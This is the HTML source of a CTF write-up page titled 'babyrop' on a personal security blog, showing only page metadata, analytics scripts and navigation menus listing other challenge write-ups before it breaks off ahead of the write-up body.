<!doctype html><html lang=en data-bs-theme=dark><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1"><link rel=preload href=/fonts/vendor/jost/jost-v4-latin-regular.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/vendor/jost/jost-v4-latin-500.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/vendor/jost/jost-v4-latin-700.woff2 as=font type=font/woff2 crossorigin><script src=/js/dismissable-alert.ecfe60f33522da00acae2a7c5195ae0237f6bf736d4c295a83700bdbcb4d0263.js integrity="sha256-7P5g8zUi2gCsrip8UZWuAjf2v3NtTClag3AL28tNAmM="></script><link rel=stylesheet href="/main.3a19445c3174e55464794f8d7b5c581d8dcdee797f74e5cbe6f59a3562e0e99186e34e57cc7c5c589d66ce9e1590c410c896d88822c3e063309dfea0fc07631f.css" integrity="sha512-OhlEXDF05VRkeU+Ne1xYHY3N7nl/dOXL5vWaNWLg6ZGG405XzHxcWJ1mzp4VkMQQyJbYiCLD4GMwnf6g/AdjHw==" crossorigin=anonymous><noscript><style>img.lazyload{display:none}</style></noscript><link rel=canonical href=/ctf/nohacknoctf/binaryexploitation/babyrop01/><title>babyrop | d3bo</title><meta name=description content><meta property="og:title" content="babyrop"><meta property="og:description" content="Analysis Main function bool main(EVP_PKEY_CTX *param_1) { bool bVar1; undefined8 local_38; undefined8 local_30; undefined8 local_28; undefined8 local_20; int local_c; init(param_1); local_38 = 0; local_30 = 0; local_28 = 0; local_20 = 0; puts(&#34;What\'s your name?"><meta property="og:type" content="article"><meta property="og:url" content="/ctf/nohacknoctf/binaryexploitation/babyrop01/"><meta property="og:image" content="/ctf/nohacknoctf/binaryexploitation/babyrop01/cover.png"><meta property="article:section" content="ctf"><meta property="article:published_time" content="2025-07-10T00:00:00+00:00"><meta property="article:modified_time" content="2025-07-10T00:00:00+00:00"><meta property="og:site_name" content="d3b0o"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/ctf/nohacknoctf/binaryexploitation/babyrop01/cover.png"><meta name=twitter:title content="babyrop"><meta name=twitter:description content="Analysis Main function bool main(EVP_PKEY_CTX *param_1) { bool bVar1; undefined8 local_38; undefined8 local_30; undefined8 local_28; undefined8 local_20; int local_c; init(param_1); local_38 = 0; local_30 = 0; local_28 = 0; local_20 = 0; puts(&#34;What\'s your name?"><meta name=twitter:site content="@getdoks"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","item":"/","name":"D3bo","position":1},{"@type":"ListItem","item":"/ctf/","name":"Ctf's","position":2},{"@type":"ListItem","item":"/ctf/nohacknoctf/","name":"No Hack No Ctf","position":3},{"@type":"ListItem","name":"Babyrop","position":4}]}</script><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap"><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1877012045454778" crossorigin=anonymous></script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-850CS210Y8"></script>
<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-850CS210Y8")</script></head><body class="single section ctf" data-bs-spy=scroll data-bs-target=#toc data-bs-root-margin="0px 0px -60%" data-bs-smooth-scroll=true tabindex=0><div id=vanta-bg style=position:absolute;width:100%;height:100%;z-index:-1></div><div id=announcement data-id=global-alert-ed321576fabf52d76f925272710cb364 class="alert alert-primary alert-dismissible fade show text-center" role=alert><span class=alert-text>¡Nuevo writeup de la máquina "<a href=/writeups/hackthebox/unobtainium>Unobtainium</a>" de HackTheBox!</span>
<button type=button class=btn-close data-bs-dismiss=alert aria-label=Close></button></div><div class=sticky-top><div class=header-bar></div><header class="navbar navbar-expand-lg"><div class=container-lg><a class="navbar-brand me-auto me-lg-3" href=/>d3bo</a>
<button type=button id=searchToggleMobile class="btn btn-link nav-link mx-2 d-lg-none" aria-label="Search website"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg></button>
<button class="btn btn-link d-lg-none" type=button data-bs-toggle=offcanvas data-bs-target=#offcanvasNavSection aria-controls=offcanvasNavSection aria-label="Open section navigation menu"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-dots-vertical" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 12m-1 0a1 1 0 102 0 1 1 0 10-2 0"/><path d="M12 19m-1 0a1 1 0 102 0 1 1 0 10-2 0"/><path d="M12 5m-1 0a1 1 0 102 0 1 1 0 10-2 0"/></svg></button><div class="offcanvas offcanvas-start d-lg-none" tabindex=-1 id=offcanvasNavSection aria-labelledby=offcanvasNavSectionLabel><div class=header-bar></div><div class=offcanvas-header><h5 class=offcanvas-title id=offcanvasNavSectionLabel>Ctf</h5><button type=button class="btn btn-link nav-link p-0" data-bs-dismiss=offcanvas aria-label=Close><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg></button></div><div class=offcanvas-body><aside class="doks-sidebar mt-n3"><nav id=doks-docs-nav aria-label="Tertiary navigation"><ul class="list-unstyled collapsible-sidebar"><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-1cad35d4b3b9f624f82dbf237daaf188 aria-expanded=false>
Intro</button><div class=collapse id=section-1cad35d4b3b9f624f82dbf237daaf188><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/intro/bienvenido/><img src=/ctf/intro/bienvenido//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Bienvenido</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-55c76aa40643ba5854bd47d052d6cd3d aria-expanded=false>
CaixaBank</button><div class=collapse id=section-55c76aa40643ba5854bd47d052d6cd3d><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li class="my-1 ms-3"><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-07811dc6c422334ce36a09ff5cd6fe71 aria-expanded=false>
2024</button><div class=collapse id=section-07811dc6c422334ce36a09ff5cd6fe71><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"></ul></div></li><li class="my-1 ms-3"><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-312351bff07989769097660a56395065 aria-expanded=false>
2025</button><div class=collapse id=section-312351bff07989769097660a56395065><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/caixabank/2025/202507/>Reto 07</a></li></ul></div></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-8c526cb24566db1d06d0df2aa2517c84 aria-expanded=false>
FCSC</button><div class=collapse id=section-8c526cb24566db1d06d0df2aa2517c84><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li class="my-1 ms-3"><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-05a5cf06982ba7892ed2a6d38fe832d6 aria-expanded=false>
2021</button><div class=collapse id=section-05a5cf06982ba7892ed2a6d38fe832d6><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/fcsc/2021/bofbof/>bofbof</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/fcsc/2021/bonuspoints/>Bonus Points</a></li></ul></div></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-d9fb08be3ed131369df5d4aa808dac70 aria-expanded=false>
HackTheBox</button><div class=collapse id=section-d9fb08be3ed131369df5d4aa808dac70><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li class="my-1 ms-3"><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-643b24eb9ab148b2d7012dcd4f0df582 aria-expanded=false>
Binary Exploitation</button><div class=collapse id=section-643b24eb9ab148b2d7012dcd4f0df582><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/hackthebox/pwn/execute/>Execute</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/hackthebox/pwn/restaurant/>Restaurant</a></li></ul></div></li><li class="my-1 ms-3"><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-3c02a379965ab0dfcd77b1c484450433 aria-expanded=false>
Hardware</button><div class=collapse id=section-3c02a379965ab0dfcd77b1c484450433><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/hackthebox/hardware/debugging-interface/>Debugging Interface</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/hackthebox/hardware/the-needle/>The Needle</a></li></ul></div></li><li class="my-1 ms-3"><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-c6e190b284633c48e39e55049da3cce8 aria-expanded=false>
Web</button><div class=collapse id=section-c6e190b284633c48e39e55049da3cce8><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/hackthebox/web/pdfy/>PDFy</a></li></ul></div></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-df813460c79d124cbe4f69630e29ebb6 aria-expanded=true>
No Hack No CTF</button><div class="collapse show" id=section-df813460c79d124cbe4f69630e29ebb6><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded active" href=/ctf/nohacknoctf/binaryexploitation/babyrop01/>babyrop</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/nohacknoctf/binaryexploitation/server_status/>Server Status</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-ed7102c6dc453239643d2f732016e4e2 aria-expanded=false>
PicoCTF</button><div class=collapse id=section-ed7102c6dc453239643d2f732016e4e2><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li class="my-1 ms-3"><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-10cdbc711ee428cd55410fe139ed0317 aria-expanded=false>
Binary Explotation</button><div class=collapse id=section-10cdbc711ee428cd55410fe139ed0317><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/babygame01/>babygame01</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/bufferoverflow-0/>Buffer Overflow 0</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/bof1/>Buffer Overflow 1</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/bufferoverflow-2/>Buffer Overflow 2</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/bufferoverflow3/>Buffer Overflow 3</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/echovalley/>Echo Valley</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/flag_leak/>Flag Leak</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/format-strings-1/>Format strings 1</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/format-strings-2/>Format strings 2</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/format-strings-3/>Format strings 3</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/heap-0/>Heap 0</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/heap1/>Heap 1</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/heap3/>Heap 3</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/heres_a_libc/>Here's a LIBC</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/hijacking/>Hijacking</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/pickeriv/>Picker IV</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/ropfu/>ropfu</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/rps/>RPS</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/stonks/>Stonks</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/two-sum/>two-sum</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/vne/>VNE</a></li></ul></div></li></ul></div></li></ul></nav></aside></div></div><button class="btn btn-link nav-link mx-2 order-3 d-lg-none" type=button data-bs-toggle=offcanvas data-bs-target=#offcanvasNavMain aria-controls=offcanvasNavMain aria-label="Open main navigation menu"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-menu" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><line x1="4" y1="8" x2="20" y2="8"/><line x1="4" y1="16" x2="20" y2="16"/></svg></button><div class="offcanvas offcanvas-end h-auto" tabindex=-1 id=offcanvasNavMain aria-labelledby=offcanvasNavMainLabel><div class="header-bar d-lg-none"></div><div class=offcanvas-header><h5 class=offcanvas-title id=offcanvasNavMainLabel>d3bo</h5><button type=button class="btn btn-link nav-link p-0" data-bs-dismiss=offcanvas aria-label=Close><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg></button></div><div class="offcanvas-body d-flex flex-column flex-lg-row justify-content-between"><ul class="navbar-nav flex-grow-1"><li class=nav-item><a class=nav-link href=/blog/>Blog</a></li><li class=nav-item><a class=nav-link href=/writeups/intro/bienvenido/>Writeups</a></li><li class=nav-item><a class=nav-link href=/ctf/intro/bienvenido/>CTF</a></li><li class=nav-item><a class=nav-link href=/archive/>Archive</a></li></ul><button type=button id=searchToggleDesktop class="btn btn-link nav-link p-2 d-none d-lg-block" aria-label="Search website"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg></button><ul id=socialMenu class="nav mx-auto flex-row order-lg-4"><li class=nav-item><a class="nav-link social-link" href=https://x.com/sr_d3b0o><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 4l11.733 16H20L8.267 4z"/><path d="M4 20l6.768-6.768m2.46-2.46L20 4"/></svg><small class="ms-2 visually-hidden">Twitter</small></a></li><li class=nav-item><a class="nav-link social-link" href=https://github.com/d3b0o><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg><small class="ms-2 visually-hidden">GitHub</small></a></li></ul><a class="btn btn-primary rounded-pill mt-2 btn-block d-lg-none" href=https://www.buymeacoffee.com/d3b0o role=button>Support</a></div></div><a class="btn btn-primary rounded-pill ms-3 me-2 px-4 order-lg-3 d-none d-lg-block" href=https://www.buymeacoffee.com/d3b0o role=button>Support</a></div></header></div><div class=modal id=searchModal tabindex=-1 aria-labelledby=searchModalLabel aria-hidden=true><div class="modal-dialog modal-dialog-scrollable modal-fullscreen-md-down"><div class=modal-content><div class=modal-header><h1 class="modal-title fs-5 visually-hidden" id=searchModalLabel>Search</h1><button type=button class="btn-close visually-hidden" data-bs-dismiss=modal aria-label=Close></button><div class="search-input flex-grow-1 d-none"><form id=search-form class=search-form action=# method=post accept-charset=utf-8 role=search><label for=query class=visually-hidden>Search</label><div class=d-flex><input type=search id=query name=query class="search-text form-control form-control-lg" placeholder=Search aria-label=Search maxlength=128 autocomplete=off>
<button type=button class="btn btn-link text-decoration-none px-0 ms-3 d-md-none" data-bs-dismiss=modal aria-label=Close>Cancel</button></div></form></div></div><div class=modal-body><p class="search-loading status message d-none mt-3 text-center">Loading search index…</p><p class="search-no-recent message d-none mt-3 text-center">No recent searches</p><p class="search-no-results message d-none mt-3 text-center">No results for "<strong><span class=query-no-results>Query here</span></strong>"</p><div id=searchResults class=search-results></div><template><article class="search-result list-view"><div class="card my-3"><div class=card-body><header><h2 class="h5 title title-submitted mb-0"><a class="stretched-link text-decoration-none text-reset" href=#>Title here</a></h2><div class=submitted><time class=created-date>Date here</time></div></header><div class="content d-none">Summary here</div></div></div></article></template></div><div class=modal-footer><ul class="list-inline me-auto d-none d-md-block"><li class=list-inline-item><kbd class=me-2><svg width="15" height="15" aria-label="Enter key" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M12 3.53088v3c0 1-1 2-2 2H4m3 3-3-3 3-3"/></g></svg></kbd><span class=DocSearch-Label>to select</span></li><li class=list-inline-item><kbd class=me-2><svg width="15" height="15" aria-label="Arrow down" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 3.5v8m3-3-3 3-3-3"/></g></svg></kbd><kbd class=me-2><svg width="15" height="15" aria-label="Arrow up" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 11.5v-8m3 3-3-3-3 3"/></g></svg></kbd><span class=DocSearch-Label>to navigate</span></li><li class=list-inline-item><kbd class=me-2><svg width="15" height="15" aria-label="Escape key" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M13.6167 8.936c-.1065.3583-.6883.962-1.4875.962-.7993.0-1.653-.9165-1.653-2.1258v-.5678c0-1.2548.7896-2.1016 1.653-2.1016s1.3601.4778 1.4875 1.0724M9 6c-.1352-.4735-.7506-.9219-1.46-.8972-.7092.0246-1.344.57-1.344 1.2166s.4198.8812 1.3445.9805C8.465 7.3992 8.968 7.9337 9 8.5s-.454 1.398-1.4595 1.398C6.6593 9.898 6 9 5.963 8.4851m-1.4748.5368c-.2635.5941-.8099.876-1.5443.876s-1.7073-.6248-1.7073-2.204v-.4603c0-1.0416.721-2.131 1.7073-2.131.9864.0 1.6425 1.031 1.5443 2.2492h-2.956"/></g></svg></kbd><span class=DocSearch-Label>to close</span></li></ul><p class=d-md-none>Search by <a class=text-decoration-none href=https://github.com/nextapps-de/flexsearch>FlexSearch</a></p></div></div></div></div><div class="wrap container-lg" role=document><div class=content><div class="row flex-xl-nowrap"><div class="col-lg-5 col-xl-4 docs-sidebar docs-sidebar-offset d-none d-lg-block"><nav class=docs-links aria-label="Main navigation"><ul class="list-unstyled collapsible-sidebar"><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-1cad35d4b3b9f624f82dbf237daaf188 aria-expanded=false>
Intro</button><div class=collapse id=section-1cad35d4b3b9f624f82dbf237daaf188><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/intro/bienvenido/><img src=/ctf/intro/bienvenido//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Bienvenido</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-55c76aa40643ba5854bd47d052d6cd3d aria-expanded=false>
CaixaBank</button><div class=collapse id=section-55c76aa40643ba5854bd47d052d6cd3d><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li class="my-1 ms-3"><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-07811dc6c422334ce36a09ff5cd6fe71 aria-expanded=false>
2024</button><div class=collapse id=section-07811dc6c422334ce36a09ff5cd6fe71><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"></ul></div></li><li class="my-1 ms-3"><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-312351bff07989769097660a56395065 aria-expanded=false>
2025</button><div class=collapse id=section-312351bff07989769097660a56395065><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/caixabank/2025/202507/>Reto 07</a></li></ul></div></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-8c526cb24566db1d06d0df2aa2517c84 aria-expanded=false>
FCSC</button><div class=collapse id=section-8c526cb24566db1d06d0df2aa2517c84><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li class="my-1 ms-3"><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-05a5cf06982ba7892ed2a6d38fe832d6 aria-expanded=false>
2021</button><div class=collapse id=section-05a5cf06982ba7892ed2a6d38fe832d6><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/fcsc/2021/bofbof/>bofbof</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/fcsc/2021/bonuspoints/>Bonus Points</a></li></ul></div></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-d9fb08be3ed131369df5d4aa808dac70 aria-expanded=false>
HackTheBox</button><div class=collapse id=section-d9fb08be3ed131369df5d4aa808dac70><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li class="my-1 ms-3"><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-643b24eb9ab148b2d7012dcd4f0df582 aria-expanded=false>
Binary Exploitation</button><div class=collapse id=section-643b24eb9ab148b2d7012dcd4f0df582><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/hackthebox/pwn/execute/>Execute</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/hackthebox/pwn/restaurant/>Restaurant</a></li></ul></div></li><li class="my-1 ms-3"><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-3c02a379965ab0dfcd77b1c484450433 aria-expanded=false>
Hardware</button><div class=collapse id=section-3c02a379965ab0dfcd77b1c484450433><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/hackthebox/hardware/debugging-interface/>Debugging Interface</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/hackthebox/hardware/the-needle/>The Needle</a></li></ul></div></li><li class="my-1 ms-3"><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-c6e190b284633c48e39e55049da3cce8 aria-expanded=false>
Web</button><div class=collapse id=section-c6e190b284633c48e39e55049da3cce8><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/hackthebox/web/pdfy/>PDFy</a></li></ul></div></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-df813460c79d124cbe4f69630e29ebb6 aria-expanded=true>
No Hack No CTF</button><div class="collapse show" id=section-df813460c79d124cbe4f69630e29ebb6><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded active" href=/ctf/nohacknoctf/binaryexploitation/babyrop01/>babyrop</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/nohacknoctf/binaryexploitation/server_status/>Server Status</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-ed7102c6dc453239643d2f732016e4e2 aria-expanded=false>
PicoCTF</button><div class=collapse id=section-ed7102c6dc453239643d2f732016e4e2><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li class="my-1 ms-3"><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-10cdbc711ee428cd55410fe139ed0317 aria-expanded=false>
Binary Explotation</button><div class=collapse id=section-10cdbc711ee428cd55410fe139ed0317><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/babygame01/>babygame01</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/bufferoverflow-0/>Buffer Overflow 0</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/bof1/>Buffer Overflow 1</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/bufferoverflow-2/>Buffer Overflow 2</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/bufferoverflow3/>Buffer Overflow 3</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/echovalley/>Echo Valley</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/flag_leak/>Flag Leak</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/format-strings-1/>Format strings 1</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/format-strings-2/>Format strings 2</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/format-strings-3/>Format strings 3</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/heap-0/>Heap 0</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/heap1/>Heap 1</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/heap3/>Heap 3</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/heres_a_libc/>Here's a LIBC</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/hijacking/>Hijacking</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/pickeriv/>Picker IV</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/ropfu/>ropfu</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/rps/>RPS</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/ctf/picoctf/binaryexplotation/stonks/>Stonks</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" 